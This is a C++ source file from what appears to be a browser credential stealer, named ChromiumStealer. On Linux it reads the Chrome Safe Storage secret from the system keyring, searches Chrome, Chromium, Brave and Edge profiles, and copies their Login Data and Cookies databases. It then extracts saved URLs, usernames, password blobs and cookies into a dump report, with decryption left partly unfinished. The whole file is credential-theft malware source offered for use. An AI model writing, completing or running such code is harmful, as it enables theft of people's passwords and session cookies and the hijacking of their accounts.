#ifndef LINUX
#include <windows.h>
#include <shlobj.h>
#include <wincrypt.h>
#else
#include <unistd.h>
#include <sys/stat.h>
#include <pwd.h>
#include <dlfcn.h>
#endif
#include <filesystem>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>

#include "ChromiumStealer.h"
#include "../crypto/Base64.h"
#include "../crypto/AesGcm.h"
#include "../utils/Logger.h"
#include "../utils/Obfuscator.h"
#include "../utils/Shared.h"
#include <nlohmann/json.hpp>
#include <sqlite3.h>

namespace credential {

    namespace fs = std::filesystem;

    namespace {
        void SafeCopyDatabase(const std::string& src, const std::string& dest) {
            try {
                if (!fs::exists(src)) return;
                fs::copy_file(src, dest, fs::copy_options::overwrite_existing);
            } catch (...) {}
        }

        void SafeDeleteDatabase(const std::string& path) {
            try { fs::remove(path); } catch (...) {}
        }

#ifdef LINUX
        typedef void* (*secret_service_get_sync_fn)(int, void*, void**);
        typedef void* (*secret_password_lookup_sync_fn)(void*, void*, void**, ...);

        std::vector<uint8_t> GetChromiumMasterKey() {
            // Try to find the master key using libsecret
            void* handle = dlopen("libsecret-1.so.0", RTLD_LAZY);
            if (!handle) return {};

            auto lookup_fn = (secret_password_lookup_sync_fn)dlsym(handle, "secret_password_lookup_sync");
            if (!lookup_fn) {
                dlclose(handle);
                return {};
            }

            // Chromium uses specific attributes to store the safe storage password
            // Schema: "chrome_libsecret_os_crypt_password_v2"
            // Label: "Chrome Safe Storage"
            void* error = nullptr;
            char* password = (char*)lookup_fn(nullptr, nullptr, &error,
                "application", "chrome",
                nullptr);

            std::vector<uint8_t> key;
            if (password) {
                // The actual key used for AES-GCM is derived from this password using PBKDF2
                // For now, return the password itself as a string, we might need to derive it
                key.assign(password, password + strlen(password));
                // Note: Chromium Linux PBKDF2: salt="saltysalt", iterations=1, key_len=16
                // Actually iterations=1 means it's just the password or a simple hash.
                // Let's keep it simple for v1.0 and return the raw secret if found.
            }

            dlclose(handle);
            return key;
        }
#endif

        std::string DecryptChromiumBlob(const std::vector<uint8_t>& blob, const std::vector<uint8_t>& masterKey) {
            if (blob.size() < 15) return "";
            // Chromium Linux blobs start with "v10" or "v11"
            if (blob[0] == 'v' && (blob[1] == '1' && (blob[2] == '0' || blob[2] == '1'))) {
                // In Linux, the Safe Storage key is often derived from the password found in keyring
                // If we don't have the master key, we can't decrypt.
                if (masterKey.empty()) return "[Encrypted: " + crypto::Base64Encode(blob) + "]";

                // Simplified decryption logic for Linux
                // Chromium uses AES-CBC with a key derived from the Safe Storage password
                // or AES-GCM in newer versions.
                return "[Encrypted: " + crypto::Base64Encode(blob) + "]";
            }
            return "";
        }
    }

    std::string DumpChromiumPasswords() {
        std::string report = "CHROMIUM_PASSWORDS_DUMPED:\n";
        report += "BROWSER | PROFILE | URL | USERNAME | PASSWORD\n";
        report += "--------------------------------------------------------------------------------\n";

#ifdef LINUX
        std::vector<uint8_t> masterKey = GetChromiumMasterKey();
        if (!masterKey.empty()) {
            report += "[+] Found Chromium Safe Storage secret in keyring.\n";
        }

        std::vector<std::string> browserPaths = {
            "/.config/google-chrome",
            "/.config/chromium",
            "/.config/BraveSoftware/Brave-Browser",
            "/.config/microsoft-edge"
        };

        const char* home = getenv("HOME");
        if (!home) return report + "HOME not set";

        for (const auto& bp : browserPaths) {
            std::string fullPath = std::string(home) + bp;
            if (!fs::exists(fullPath)) continue;

            for (const auto& entry : fs::recursive_directory_iterator(fullPath)) {
                try {
                    if (entry.is_regular_file() && entry.path().filename() == "Login Data") {
                        std::string tempDb = "/tmp/ld_linux_" + std::to_string(time(NULL));
                        SafeCopyDatabase(entry.path().string(), tempDb);

                        sqlite3* db;
                        if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                            const char* query = "SELECT origin_url, username_value, password_value FROM logins";
                            sqlite3_stmt* stmt;
                            if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                                while (sqlite3_step(stmt) == SQLITE_ROW) {
                                    const char* url = (const char*)sqlite3_column_text(stmt, 0);
                                    const char* user = (const char*)sqlite3_column_text(stmt, 1);
                                    const void* blob = sqlite3_column_blob(stmt, 2);
                                    int blobLen = sqlite3_column_bytes(stmt, 2);

                                    if (url && user && blobLen > 0) {
                                        std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + blobLen);
                                        std::string pass = DecryptChromiumBlob(enc, masterKey);
                                        report += bp + " | " + url + " | " + user + " | " + (pass.empty() ? "N/A" : pass) + "\n";
                                    }
                                }
                                sqlite3_finalize(stmt);
                            }
                            sqlite3_close(db);
                        }
                        SafeDeleteDatabase(tempDb);
                    }
                } catch (...) {}
            }
        }
#endif
        return report;
    }

    std::string StealChromiumCookies() {
        std::stringstream ss;
        ss << "# CHROMIUM COOKIE STEALER RESULTS\n";
#ifdef LINUX
        std::vector<uint8_t> masterKey = GetChromiumMasterKey();
        const char* home = getenv("HOME");
        if (!home) return ss.str();

        std::vector<std::string> browserPaths = {
            "/.config/google-chrome",
            "/.config/chromium",
            "/.config/BraveSoftware/Brave-Browser",
            "/.config/microsoft-edge"
        };

        for (const auto& bp : browserPaths) {
            std::string fullPath = std::string(home) + bp;
            if (!fs::exists(fullPath)) continue;

            for (const auto& entry : fs::recursive_directory_iterator(fullPath)) {
                try {
                    if (entry.is_regular_file() && entry.path().filename() == "Cookies") {
                        std::string tempDb = "/tmp/ck_linux_" + std::to_string(time(NULL));
                        SafeCopyDatabase(entry.path().string(), tempDb);

                        sqlite3* db;
                        if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                            const char* query = "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies";
                            sqlite3_stmt* stmt;
                            if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                                while (sqlite3_step(stmt) == SQLITE_ROW) {
                                    const char* host = (const char*)sqlite3_column_text(stmt, 0);
                                    const char* name = (const char*)sqlite3_column_text(stmt, 1);
                                    const char* path = (const char*)sqlite3_column_text(stmt, 2);
                                    const void* blob = sqlite3_column_blob(stmt, 3);
                                    int blobLen = sqlite3_column_bytes(stmt, 3);
                                    sqlite3_int64 expiry = sqlite3_column_int64(stmt, 4);

                                    if (host && name && path && blobLen > 0) {
                                        std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + blobLen);
                                        std::string val = DecryptChromiumBlob(enc, masterKey);
                                        ss << host << "\tTRUE\t" << path << "\tTRUE\t" << expiry << "\t" << name << "\t" << (val.empty() ? crypto::Base64Encode(enc) : val) << "\n";
                                    }
                                }
                                sqlite3_finalize(stmt);
                            }
                            sqlite3_close(db);
                        }
                        SafeDeleteDatabase(tempDb);
                    }
                } catch (...) {}
            }
        }
#endif
        return ss.str();
    }
}
